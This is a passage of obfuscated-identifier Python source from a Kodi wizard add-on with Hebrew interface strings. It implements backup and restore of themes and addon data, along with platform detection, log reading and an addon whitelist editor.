				if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include the [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0O0O00O00O000O00 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:1812
					OOOOOOO000OOOO000 .write (os .path .join (DATABASE ,O0O0O00O00O000O00 ),'/userdata/Database/%s'%O0O0O00O00O000O00 ,zipfile .ZIP_DEFLATED )#line:1813
			if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include any addons?[/COLOR]"%(COLOR2 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:1814
				O0OOO0000O000OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:1815
				O0O0O0O00O0OO0OO0 =[];O00OOOOO0O00000O0 =[]#line:1816
				for OOO000O0O0000OO0O in sorted (O0OOO0000O000OO0O ,key =lambda OOOOO000O0OO0O0O0 :OOOOO000O0OO0O0O0 ):#line:1817
					OO0OO0O000O0OO0OO =os .path .split (OOO000O0O0000OO0O [:-1 ])[1 ]#line:1818
					if OO0OO0O000O0OO0OO in EXCLUDES :continue #line:1819
					elif OO0OO0O000O0OO0OO in DEFAULTPLUGINS :continue #line:1820
					elif OO0OO0O000O0OO0OO =='packages':continue #line:1821
					OOOOO0OO00OO000OO =os .path .join (OOO000O0O0000OO0O ,'addon.xml')#line:1822
					if os .path .exists (OOOOO0OO00OO000OO ):#line:1823
						OOOO0O0O0OOO0000O =open (OOOOO0OO00OO000OO )#line:1824
						OOOOOOO0OO0OO0000 =OOOO0O0O0OOO0000O .read ()#line:1825
						OOO0OO0OOO000OO0O =parseDOM (OOOOOOO0OO0OO0000 ,'addon',ret ='name')#line:1826
						if len (OOO0OO0OOO000OO0O )>0 :#line:1827
							O0O0O0O00O0OO0OO0 .append (OOO0OO0OOO000OO0O [0 ])#line:1828
							O00OOOOO0O00000O0 .append (OO0OO0O000O0OO0OO )#line:1829
						else :#line:1830
							O0O0O0O00O0OO0OO0 .append (OO0OO0O000O0OO0OO )#line:1831
							O00OOOOO0O00000O0 .append (OO0OO0O000O0OO0OO )#line:1832
				if KODIV >16 :#line:1833
					O00OO0O00OOOO00O0 =DIALOG .multiselect ("%s: Select the addons you wish to add to the zip."%ADDONTITLE ,O0O0O0O00O0OO0OO0 )#line:1834
				else :#line:1835
					O00OO0O00OOOO00O0 =[];OOOOOO0O000O0OOO0 =0 #line:1836
					OOO0OO0O0O000O0OO =["-- Click here to Continue --"]+O0O0O0O00O0OO0OO0 #line:1837
					while not OOOOOO0O000O0OOO0 ==-1 :#line:1838
						OOOOOO0O000O0OOO0 =DIALOG .select ("%s: Select the addons you wish to add to the zip."%ADDONTITLE ,OOO0OO0O0O000O0OO )#line:1839
						if OOOOOO0O000O0OOO0 ==-1 :break #line:1840
						elif OOOOOO0O000O0OOO0 ==0 :break #line:1841
						else :#line:1842
							O0O0OOOO000O0OOOO =(OOOOOO0O000O0OOO0 -1 )#line:1843
							if O0O0OOOO000O0OOOO in O00OO0O00OOOO00O0 :#line:1844
								O00OO0O00OOOO00O0 .remove (O0O0OOOO000O0OOOO )#line:1845
								OOO0OO0O0O000O0OO [OOOOOO0O000O0OOO0 ]=O0O0O0O00O0OO0OO0 [O0O0OOOO000O0OOOO ]#line:1846
							else :#line:1847
								O00OO0O00OOOO00O0 .append (O0O0OOOO000O0OOOO )#line:1848
								OOO0OO0O0O000O0OO [OOOOOO0O000O0OOO0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0O0O0O00O0OO0OO0 [O0O0OOOO000O0OOOO ])#line:1849
				if len (O00OO0O00OOOO00O0 )>0 :#line:1850
					for O00O000O0000O000O in O00OO0O00OOOO00O0 :#line:1851
						for O000OOO0OO0OO00OO ,OO000OOOOO0O000O0 ,OO00O0O0000O0O0O0 in os .walk (os .path .join (ADDONS ,O00OOOOO0O00000O0 [O00O000O0000O000O ])):#line:1852
							OO00O0O0000O0O0O0 [:]=[O0000O0OO0O0OOO00 for O0000O0OO0O0OOO00 in OO00O0O0000O0O0O0 if O0000O0OO0O0OOO00 not in OOO000OOO00000OOO ]#line:1853
							for OO0OOOO0000O0OO0O in OO00O0O0000O0O0O0 :#line:1854
								if OO0OOOO0000O0OO0O .endswith ('.pyo'):continue #line:1855
								O00000OO0OOO0000O =os .path .join (O000OOO0OO0OO00OO ,OO0OOOO0000O0OO0O )#line:1856
								OOOOOOO000OOOO000 .write (O00000OO0OOO0000O ,O00000OO0OOO0000O [len (HOME ):],zipfile .ZIP_DEFLATED )#line:1857
			if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include the [COLOR %s]guisettings.xml[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:1858
				OOOOOOO000OOOO000 .write (GUISETTINGS ,'/userdata/guisettings.xml',zipfile .ZIP_DEFLATED )#line:1859
		except Exception as OO0O0OO000000OOO0 :#line:1860
			OOOOOOO000OOOO000 .close ()#line:1861
			log ("[Back Up] Type = '%s': %s"%(O00O00O0O0OO0O00O ,str (OO0O0OO000000OOO0 )),xbmc .LOGNOTICE )#line:1862
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] theme zip failed:[/COLOR]"%(COLOR1 ,O0O0O00O000OO0OOO ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,str (OO0O0OO000000OOO0 )))#line:1863
			if not O000OO0OOOOO000OO =='':#line:1864
				try :os .remove (xbmc .translatePath (O000OO0OOOOO000OO ))#line:1865
				except Exception as OO0O0OO000000OOO0 :log (str (OO0O0OO000000OOO0 ))#line:1866
			else :#line:1867
				try :os .remove (xbmc .translatePath (OO0OOO0O000OO0O00 ))#line:1868
				except Exception as OO0O0OO000000OOO0 :log (str (OO0O0OO000000OOO0 ))#line:1869
			return #line:1870
		OOOOOOO000OOOO000 .close ()#line:1871
		if not O000OO0OOOOO000OO =='':#line:1872
			OO000000O00OO0OOO =xbmcvfs .rename (O000OO0OOOOO000OO ,OO0OOO0O000OO0O00 )#line:1873
			if OO000000O00OO0OOO ==0 :#line:1874
				xbmcvfs .copy (O000OO0OOOOO000OO ,OO0OOO0O000OO0O00 )#line:1875
				xbmcvfs .delete (O000OO0OOOOO000OO )#line:1876
		DIALOG .ok (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] theme zip successful:[/COLOR]"%(COLOR1 ,O0O0O00O000OO0OOO ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO0O000OO0O00 ))#line:1877
	elif O00O00O0O0OO0O00O =="addondata":#line:1878
		if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]לבצע גיבוי הגדרות?[/COLOR]"%COLOR2 ,nolabel ="[B][COLOR white]ביטול [/COLOR][/B]",yeslabel ="[B][COLOR green]אישור[/COLOR][/B]"):#line:1879
			if name =="":#line:1880
				name =getKeyboard ("","הכנס שם באנגלית לקובץ הגיבוי")#line:1881
				if not name :return False #line:1882
				name =urllib .quote_plus (name )#line:1883
			name ='%s_addondata.zip'%name ;O000OO0OOOOO000OO =''#line:1884
			OO0OOO0O000OO0O00 =os .path .join (OO0OO0OOOO0O0O00O ,name )#line:1885
			try :#line:1886
				OOOOOOO000OOOO000 =zipfile .ZipFile (xbmc .translatePath (OO0OOO0O000OO0O00 ),mode ='w')#line:1887
			except :#line:1888
				try :#line:1889
					O000OO0OOOOO000OO =os .path .join (PACKAGES ,'%s.zip'%name )#line:1890
					OOOOOOO000OOOO000 =zipfile .ZipFile (O000OO0OOOOO000OO ,mode ='w')#line:1891
				except :#line:1892
					log ("Unable to create %s_addondata.zip"%name ,xbmc .LOGERROR )#line:1893
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]אין באפשרותנו לכתוב לספריית הגיבוי הנוכחית, האם ברצונך לשנות את המיקום?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]אישור[/COLOR][/B]",nolabel ="[B][COLOR white]ביטול[/COLOR][/B]"):#line:1894
						openS ()#line:1895
						return #line:1896
					else :#line:1897
						return #line:1898
			O0O0OO00O0O0O0OOO =0 #line:1899
			O0O0O00OOO0O000O0 =[]#line:1900
			convertSpecial (ADDOND ,True )#line:1901
			asciiCheck (ADDOND ,True )#line:1902
			DP .create ("[COLOR %s]%s[/COLOR][COLOR %s]: Creating Zip[/COLOR]"%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Creating back up zip"%COLOR2 ,"","Please Wait...[/COLOR]")#line:1903
			for O000OOO0OO0OO00OO ,OO000OOOOO0O000O0 ,OO00O0O0000O0O0O0 in os .walk (ADDOND ):#line:1904
				OO000OOOOO0O000O0 [:]=[OO0OO00OO0OO0O0O0 for OO0OO00OO0OO0O0O0 in OO000OOOOO0O000O0 if OO0OO00OO0OO0O0O0 not in O0OOO0O0OO0O00O0O ]#line:1905
				OO00O0O0000O0O0O0 [:]=[O0O0000O0O000O0O0 for O0O0000O0O000O0O0 in OO00O0O0000O0O0O0 if O0O0000O0O000O0O0 not in OOO000OOO00000OOO ]#line:1906
				for OO0OOOO0000O0OO0O in OO00O0O0000O0O0O0 :#line:1907
					O0O0O00OOO0O000O0 .append (OO0OOOO0000O0OO0O )#line:1908
			O00000O000OOO00O0 =len (O0O0O00OOO0O000O0 )#line:1909
			for O000OOO0OO0OO00OO ,OO000OOOOO0O000O0 ,OO00O0O0000O0O0O0 in os .walk (ADDOND ):#line:1910
				OO000OOOOO0O000O0 [:]=[O0OOO00OOOO000OOO for O0OOO00OOOO000OOO in OO000OOOOO0O000O0 if O0OOO00OOOO000OOO not in O0OOO0O0OO0O00O0O ]#line:1911
				OO00O0O0000O0O0O0 [:]=[OOO0O0O00000OOOO0 for OOO0O0O00000OOOO0 in OO00O0O0000O0O0O0 if OOO0O0O00000OOOO0 not in OOO000OOO00000OOO ]#line:1912
				for OO0OOOO0000O0OO0O in OO00O0O0000O0O0O0 :#line:1913
					try :#line:1914
						O0O0OO00O0O0O0OOO +=1 #line:1915
						OO0O0000O0OO00O00 =percentage (O0O0OO00O0O0O0OOO ,O00000O000OOO00O0 )#line:1916
						DP .update (int (OO0O0000O0OO00O00 ),'[COLOR %s]Creating back up zip: [COLOR%s]%s[/COLOR] / [COLOR%s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OO00O0O0O0OOO ,COLOR1 ,O00000O000OOO00O0 ),'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OOOO0000O0OO0O ),'')#line:1917
						O00000OO0OOO0000O =os .path .join (O000OOO0OO0OO00OO ,OO0OOOO0000O0OO0O )#line:1918
						if OO0OOOO0000O0OO0O in LOGFILES :log ("[Back Up] Type = '%s': Ignore %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE );continue #line:1919
						elif os .path .join (O000OOO0OO0OO00OO ,OO0OOOO0000O0OO0O )in OOOO00000OO0O00OO :log ("[Back Up] Type = '%s': Ignore %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE );continue #line:1920
						elif os .path .join ('addons','packages')in O00000OO0OOO0000O :log ("[Back Up] Type = '%s': Ignore %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE );continue #line:1921
						elif OO0OOOO0000O0OO0O .endswith ('.csv'):log ("[Back Up] Type = '%s': Ignore %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE );continue #line:1922
						elif OO0OOOO0000O0OO0O .endswith ('.db')and 'Database'in O000OOO0OO0OO00OO :#line:1923
							OO000OOO0OO0OO0O0 =OO0OOOO0000O0OO0O .replace ('.db','')#line:1924
							OO000OOO0OO0OO0O0 =''.join ([O000O0OO000OO0O0O for O000O0OO000OO0O0O in OO000OOO0OO0OO0O0 if not O000O0OO000OO0O0O .isdigit ()])#line:1925
							if OO000OOO0OO0OO0O0 in ['Addons','ADSP','Epg','MyMusic','MyVideos','Textures','TV','ViewModes']:#line:1926
								if not OO0OOOO0000O0OO0O ==latestDB (OO000OOO0OO0OO0O0 ):log ("[Back Up] Type = '%s': Ignore %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE );continue #line:1927
						try :#line:1928
							OOOOOOO000OOOO000 .write (O00000OO0OOO0000O ,O00000OO0OOO0000O [len (ADDOND ):],zipfile .ZIP_DEFLATED )#line:1929
						except Exception as OO0O0OO000000OOO0 :#line:1930
							log ("[Back Up] Type = '%s': Unable to backup %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE )#line:1931
							log ("Backup Error: %s"%str (OO0O0OO000000OOO0 ),xbmc .LOGNOTICE )#line:1932
					except Exception as OO0O0OO000000OOO0 :#line:1933
						log ("[Back Up] Type = '%s': Unable to backup %s"%(O00O00O0O0OO0O00O ,OO0OOOO0000O0OO0O ),xbmc .LOGNOTICE )#line:1934
						log ("Backup Error: %s"%str (OO0O0OO000000OOO0 ),xbmc .LOGNOTICE )#line:1935
			OOOOOOO000OOOO000 .close ()#line:1936
			if not O000OO0OOOOO000OO =='':#line:1937
				OO000000O00OO0OOO =xbmcvfs .rename (O000OO0OOOOO000OO ,OO0OOO0O000OO0O00 )#line:1938
				if OO000000O00OO0OOO ==0 :#line:1939
					xbmcvfs .copy (O000OO0OOOOO000OO ,OO0OOO0O000OO0O00 )#line:1940
					xbmcvfs .delete (O000OO0OOOOO000OO )#line:1941
			DP .close ()#line:1942
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]הגיבוי בוצע בהצלחה![/COLOR]"%(COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO0O000OO0O00 ))#line:1943
def restoreLocal (O000O00O000OOO00O ):#line:1945
	OOO00OO000O0OOO0O =xbmc .translatePath (BACKUPLOCATION )#line:1946
	OOOOO0O0O00O000OO =xbmc .translatePath (MYBUILDS )#line:1947
	try :#line:1948
		if not os .path .exists (OOO00OO000O0OOO0O ):xbmcvfs .mkdirs (OOO00OO000O0OOO0O )#line:1949
		if not os .path .exists (OOOOO0O0O00O000OO ):xbmcvfs .mkdirs (OOOOO0O0O00O000OO )#line:1950
	except Exception as O00O0OOO0OO00O0O0 :#line:1951
		DIALOG .ok (ADDONTITLE ,"[COLOR %s]Error making Back Up directories:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,str (O00O0OOO0OO00O0O0 )))#line:1952
		return #line:1953
	O0O0OOO0O0O000OOO =DIALOG .browse (1 ,'[COLOR %s]בחר את הקובץ שתרצה לשחזר[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:1954
	log ("[RESTORE BACKUP %s] File: %s "%(O000O00O000OOO00O .upper (),O0O0OOO0O0O000OOO ),xbmc .LOGNOTICE )#line:1955
	if O0O0OOO0O0O000OOO ==""or not O0O0OOO0O0O000OOO .endswith ('.zip'):#line:1956
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore: Cancelled[/COLOR]"%COLOR2 )#line:1957
		return #line:1958
	DP .create (ADDONTITLE ,'[COLOR %s]Installing Local Backup'%COLOR2 ,'','Please Wait[/COLOR]')#line:1959
	if not os .path .exists (USERDATA ):os .makedirs (USERDATA )#line:1960
	if not os .path .exists (ADDOND ):os .makedirs (ADDOND )#line:1961
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:1962
	if O000O00O000OOO00O =="gui":O0O0O0O00000OO000 =USERDATA #line:1963
	elif O000O00O000OOO00O =="addondata":#line:1964
		O0O0O0O00000OO000 =ADDOND #line:1965
	else :O0O0O0O00000OO000 =HOME #line:1966
	log ("Restoring to %s"%O0O0O0O00000OO000 ,xbmc .LOGNOTICE )#line:1967
	OO0O000OO0OO00OO0 =os .path .split (O0O0OOO0O0O000OOO )#line:1968
	O000O0OOO00OO0O00 =OO0O000OO0OO00OO0 [1 ]#line:1969
	try :#line:1970
		zipfile .ZipFile (O0O0OOO0O0O000OOO ,'r')#line:1971
	except :#line:1972
		DP .update (0 ,'[COLOR %s]Unable to read zipfile from current location.'%COLOR2 ,'Copying file to packages')#line:1973
		O00OO000OOO0O0000 =os .path .join ('special://home','addons','packages',O000O0OOO00OO0O00 )#line:1974
		xbmcvfs .copy (O0O0OOO0O0O000OOO ,O00OO000OOO0O0000 )#line:1975
		O0O0OOO0O0O000OOO =xbmc .translatePath (O00OO000OOO0O0000 )#line:1976
		DP .update (0 ,'','Copying file to packages: Complete')#line:1977
		zipfile .ZipFile (O0O0OOO0O0O000OOO ,'r')#line:1978
	O0OOOOOO00OO000O0 ,O0OOOOOO0OO0O0OOO ,OO0OOO0OO0OO0OOO0 =extract .all (O0O0OOO0O0O000OOO ,O0O0O0O00000OO000 ,DP )#line:1979
	fixmetas ()#line:1980
	clearS ('build')#line:1981
	DP .close ()#line:1982
	defaultSkin ()#line:1983
	lookandFeelData ('save')#line:1984
	if not O0O0OOO0O0O000OOO .find ('packages')==-1 :#line:1985
		try :os .remove (O0O0OOO0O0O000OOO )#line:1986
		except :pass #line:1987
	if int (O0OOOOOO0OO0O0OOO )>=1 :#line:1988
		OO0O00O0O00O0OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O0OOO00OO0O00 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0OOOOOO00OO000O0 ,'%',COLOR1 ,O0OOOOOO0OO0O0OOO ),'Would you like to view the errors?[/COLOR]',nolabel ='[B][COLOR red]No Thanks[/COLOR][/B]',yeslabel ='[B][COLOR green]View Errors[/COLOR][/B]')#line:1989
		if OO0O00O0O00O0OO00 :#line:1990
			if isinstance (O0OOOOOO0OO0O0OOO ,unicode ):#line:1991
				OO0OOO0OO0OO0OOO0 =OO0OOO0OO0OO0OOO0 .encode ('utf-8')#line:1992
			TextBox (ADDONTITLE ,OO0OOO0OO0OO0OOO0 .replace ('\t',''))#line:1993
	setS ('installed','true')#line:1994
	setS ('extract',str (O0OOOOOO00OO000O0 ))#line:1995
	setS ('errors',str (O0OOOOOO0OO0O0OOO ))#line:1996
	if INSTALLMETHOD ==1 :O000000O000OO0O00 =1 #line:1997
	elif INSTALLMETHOD ==2 :O000000O000OO0O00 =0 #line:1998
	else :DIALOG .ok (ADDONTITLE ,"[COLOR %s]השחזור בוצע בהצלחה![/COLOR]"%COLOR2 );killxbmc ('true')#line:1999
	if O000000O000OO0O00 ==1 :reloadFix ()#line:2000
	else :killxbmc (True )#line:2001
def restoreExternal (O0000000O0O0O0OOO ):#line:2003
	OO000O0O0O0OOO0O0 =DIALOG .browse (1 ,'[COLOR %s]Select the backup file you want to restore[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:2004
	if OO000O0O0O0OOO0O0 ==""or not OO000O0O0O0OOO0O0 .endswith ('.zip'):#line:2005
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore: Cancelled[/COLOR]"%COLOR2 )#line:2006
		return #line:2007
	if not OO000O0O0O0OOO0O0 .startswith ('http'):#line:2008
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore: Invalid URL[/COLOR]"%COLOR2 )#line:2009
		return #line:2010
	try :#line:2011
		O000OO0O0OOOO0OO0 =workingURL (OO000O0O0O0OOO0O0 )#line:2012
	except :#line:2013
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore: Error Valid URL[/COLOR]"%COLOR2 )#line:2014
		log ("Not a working url, if source was local then use local restore option",xbmc .LOGNOTICE )#line:2015
		log ("External Source: %s"%OO000O0O0O0OOO0O0 ,xbmc .LOGNOTICE )#line:2016
		return #line:2017
	log ("[RESTORE EXT BACKUP %s] File: %s "%(O0000000O0O0O0OOO .upper (),OO000O0O0O0OOO0O0 ),xbmc .LOGNOTICE )#line:2018
	OO000OOOO000OOOOO =os .path .split (OO000O0O0O0OOO0O0 );OOO0OO0OO0000000O =OO000OOOO000OOOOO [1 ]#line:2019
	DP .create (ADDONTITLE ,'[COLOR %s]Downloading Zip file'%COLOR2 ,'','Please Wait[/COLOR]')#line:2020
	if O0000000O0O0O0OOO =="gui":OOOOOOOO00OOOOOOO =USERDATA #line:2021
	elif O0000000O0O0O0OOO =="addondata":OOOOOOOO00OOOOOOO =ADDOND #line:2022
	else :OOOOOOOO00OOOOOOO =HOME #line:2023
	if not os .path .exists (USERDATA ):os .makedirs (USERDATA )#line:2024
	if not os .path .exists (ADDOND ):os .makedirs (ADDOND )#line:2025
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2026
	O0O0OOO0O00O00O00 =os .path .join (PACKAGES ,OOO0OO0OO0000000O )#line:2027
	downloader .download (OO000O0O0O0OOO0O0 ,O0O0OOO0O00O00O00 ,DP )#line:2028
	DP .update (0 ,'Installing External Backup','','Please Wait')#line:2029
	OOO0O0000O000O0OO ,O0OO00OO00O00O000 ,O0OO0000OO0O00O00 =extract .all (O0O0OOO0O00O00O00 ,OOOOOOOO00OOOOOOO ,DP )#line:2030
	fixmetas ()#line:2031
	clearS ('build')#line:2032
	DP .close ()#line:2033
	defaultSkin ()#line:2034
	lookandFeelData ('save')#line:2035
	if int (O0OO00OO00O00O000 )>=1 :#line:2036
		O0000OOOOOO0OOOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO0OO0000000O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOO0O0000O000O0OO ,'%',COLOR1 ,O0OO00OO00O00O000 ),'Would you like to view the errors?[/COLOR]',nolabel ='[B][COLOR red]No Thanks[/COLOR][/B]',yeslabel ='[B][COLOR green]View Errors[/COLOR][/B]')#line:2037
		if O0000OOOOOO0OOOO0 :#line:2038
			TextBox (ADDONTITLE ,O0OO0000OO0O00O00 .replace ('\t',''))#line:2039
	setS ('installed','true')#line:2040
	setS ('extract',str (OOO0O0000O000O0OO ))#line:2041
	setS ('errors',str (O0OO00OO00O00O000 ))#line:2042
	try :os .remove (O0O0OOO0O00O00O00 )#line:2043
	except :pass #line:2044
	if INSTALLMETHOD ==1 :OO0OOO00OO0OO0O0O =1 #line:2045
	elif INSTALLMETHOD ==2 :OO0OOO00OO0OO0O0O =0 #line:2046
	else :OO0OOO00OO0OO0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR green]Force Close[/COLOR][/B]")#line:2047
	if OO0OOO00OO0OO0O0O ==1 :reloadFix ()#line:2048
	else :killxbmc (True )#line:2049
def platform ():#line:2055
	if xbmc .getCondVisibility ('system.platform.android'):return 'android'#line:2056
	elif xbmc .getCondVisibility ('system.platform.linux'):return 'linux'#line:2057
	elif xbmc .getCondVisibility ('system.platform.linux.Raspberrypi'):return 'linux'#line:2058
	elif xbmc .getCondVisibility ('system.platform.windows'):return 'windows'#line:2059
	elif xbmc .getCondVisibility ('system.platform.osx'):return 'osx'#line:2060
	elif xbmc .getCondVisibility ('system.platform.atv2'):return 'atv2'#line:2061
	elif xbmc .getCondVisibility ('system.platform.ios'):return 'ios'#line:2062
	elif xbmc .getCondVisibility ('system.platform.darwin'):return 'ios'#line:2063
def Grab_Log (file =False ,old =False ,wizard =False ):#line:2065
	if wizard ==True :#line:2066
		if not os .path .exists (WIZLOG ):return False #line:2067
		else :#line:2068
			if file ==True :#line:2069
				return WIZLOG #line:2070
			else :#line:2071
				OO000O0000O0O0000 =open (WIZLOG ,'r')#line:2072
				OOOO00000000O000O =OO000O0000O0O0000 .read ()#line:2073
				OO000O0000O0O0000 .close ()#line:2074
				return OOOO00000000O000O #line:2075
	OOO00O0O0O0OO0O00 =0 #line:2076
	O0O00OO00000000OO =os .listdir (LOG )#line:2077
	O0OOO00OOO000OO00 =[]#line:2078
	for OOOO000OO00O00000 in O0O00OO00000000OO :#line:2080
		if old ==True and OOOO000OO00O00000 .endswith ('.old.log'):O0OOO00OOO000OO00 .append (os .path .join (LOG ,OOOO000OO00O00000 ))#line:2081
		elif old ==False and OOOO000OO00O00000 .endswith ('.log')and not OOOO000OO00O00000 .endswith ('.old.log'):O0OOO00OOO000OO00 .append (os .path .join (LOG ,OOOO000OO00O00000 ))#line:2082
	if len (O0OOO00OOO000OO00 )>0 :#line:2084
		O0OOO00OOO000OO00 .sort (key =lambda OOO0O00O0OO0O0OOO :os .path .getmtime (OOO0O00O0OO0O0OOO ))#line:2085
		if file ==True :return O0OOO00OOO000OO00 [-1 ]#line:2086
		else :#line:2087
			OO000O0000O0O0000 =open (O0OOO00OOO000OO00 [-1 ],'r')#line:2088
			OOOO00000000O000O =OO000O0000O0O0000 .read ()#line:2089
			OO000O0000O0O0000 .close ()#line:2090
			return OOOO00000000O000O #line:2091
	else :#line:2092
		return False #line:2093
def whiteList (OOO0OOOOO00O000O0 ):#line:2095
	O0OO0O0O000000OOO =xbmc .translatePath (BACKUPLOCATION )#line:2096
	O000OOOO0O000OO00 =xbmc .translatePath (MYBUILDS )#line:2097
	if OOO0OOOOO00O000O0 =='edit':#line:2098
		O0O0OO0O00O0O00O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2099
		O0O0O0OOO0O0OOO00 =[];O0OOO000OO0000000 =[];O0O0OO0OO000OOO00 =[]#line:2100
		for O00000OO0000OO0OO in sorted (O0O0OO0O00O0O00O0 ,key =lambda O00O0O000000O0O00 :O00O0O000000O0O00 ):#line:2101
			OOO0OO0O00O0000OO =os .path .split (O00000OO0000OO0OO [:-1 ])[1 ]#line:2102
			if OOO0OO0O00O0000OO in EXCLUDES :continue #line:2103
			elif OOO0OO0O00O0000OO in DEFAULTPLUGINS :continue #line:2104
			elif OOO0OO0O00O0000OO =='packages':continue #line:2105
			OO0OO000OO0000000 =os .path .join (O00000OO0000OO0OO ,'addon.xml')#line:2106
			if os .path .exists (OO0OO000OO0000000 ):#line:2107
				OO000OO0OOO0OOOOO =open (OO0OO000OO0000000 )#line:2108
				O0OO0OOOO00OOO000 =OO000OO0OOO0OOOOO .read ()#line:2109
				OO000OO0OOO0OOOOO .close ()#line:2110
				OOOOO000O0OO0OO0O =parseDOM (O0OO0OOOO00OOO000 ,'addon',ret ='id')#line:2111
				O00000O00OOOO0O0O =parseDOM (O0OO0OOOO00OOO000 ,'addon',ret ='name')#line:2112
				O000O0000OOOOO00O =OOO0OO0O00O0000OO if len (OOOOO000O0OO0OO0O )==0 else OOOOO000O0OO0OO0O [0 ]#line:2113
				O0O00O000000O0O00 =OOO0OO0O00O0000OO if len (O00000O00OOOO0O0O )==0 else O00000O00OOOO0O0O [0 ]#line:2114
				OOO000O0OO0OOO0OO =O0O00O000000O0O00 .replace ('[','<').replace (']','>')#line:2115
				OOO000O0OO0OOO0OO =re .sub ('<[^<]+?>','',OOO000O0OO0OOO0OO )#line:2116
				O0O0O0OOO0O0OOO00 .append (OOO000O0OO0OOO0OO )#line:2117
				O0OOO000OO0000000 .append (O000O0000OOOOO00O )#line:2118
				O0O0OO0OO000OOO00 .append (OOO0OO0O00O0000OO )#line:2119
		O0O000OOOO0OO00OO =glob .glob (os .path .join (ADDOND ,'*/'))#line:2120
		for O00000OO0000OO0OO in sorted (O0O000OOOO0OO00OO ,key =lambda OO000000OO000O000 :OO000000OO000O000 ):#line:2121
			OOO0OO0O00O0000OO =os .path .split (O00000OO0000OO0OO [:-1 ])[1 ]#line:2122
			if OOO0OO0O00O0000OO in O0O0OO0OO000OOO00 :continue #line:2123
			if OOO0OO0O00O0000OO in EXCLUDES :continue #line:2124
			OO0OO000OO0000000 =os .path .join (ADDONS ,OOO0OO0O00O0000OO ,'addon.xml')#line:2125
			O0O0OOO00OOO0O0O0 =os .path .join (XBMC ,'addons',OOO0OO0O00O0000OO ,'addon.xml')#line:2126
			if os .path .exists (OO0OO000OO0000000 ):#line:2127
				OO000OO0OOO0OOOOO =open (OO0OO000OO0000000 )#line:2128
			elif os .path .exists (O0O0OOO00OOO0O0O0 ):#line:2129
				OO000OO0OOO0OOOOO =open (O0O0OOO00OOO0O0O0 )#line:2130
			else :continue #line:2131
			O0OO0OOOO00OOO000 =OO000OO0OOO0OOOOO .read ()#line:2132
			OO000OO0OOO0OOOOO .close ()#line:2133
			OOOOO000O0OO0OO0O =parseDOM (O0OO0OOOO00OOO000 ,'addon',ret ='id')#line:2134
